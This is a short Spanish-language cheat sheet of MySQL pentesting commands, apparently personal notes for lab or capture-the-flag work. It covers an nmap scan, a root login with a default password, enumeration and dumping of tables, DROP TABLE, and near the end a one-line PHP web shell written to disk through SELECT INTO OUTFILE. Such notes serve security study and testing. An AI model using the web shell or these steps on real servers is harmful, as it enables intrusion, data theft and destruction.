# Relacionarse

### Scan

    sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

### Conectar

    mysql -u root -p'root' -h 192.168.50.16 -P 3306 --ssl=FALSE

### Version

    select version();
### ver privilegios:
    SHOW GRANTS;

### Leer variables de entorno:
    SHOW VARIABLES LIKE '<variable>';

### Ver si tenemos permisos para relacionarnos con archivos
    SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

### Ver dbs

    show databases;

### Ver tablas

    show tables;

### ver estructura de una tabla:
    DESCRIBE <tabla>;
    
### Dumpear datos de una tabla

    select * from <tabla>

### Buscar un dato en base a un patrón (coincidencia de letras en un nombre, etc):
    SELECT * FROM <tabla> WHERE <campo> LIKE <condición >

### Eliminar una tabla de un servidor:
    DROP TABLE <tabla>;

---
# Creacion

### crear una DB:
    CREATE DATABASE "nombre";

### insertar un registro en una tabla:
    INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);



si somos DBA y sabemos cómo acceder a los archivos desde un servicio web, podemos crear una shell:
SELECT '<?php system($_GET[1]); ?>' INTO OUTFILE 'path_to_file';



el resto en:
https://github.com/LaPorota/LaPorota_suite/blob/main/sqli
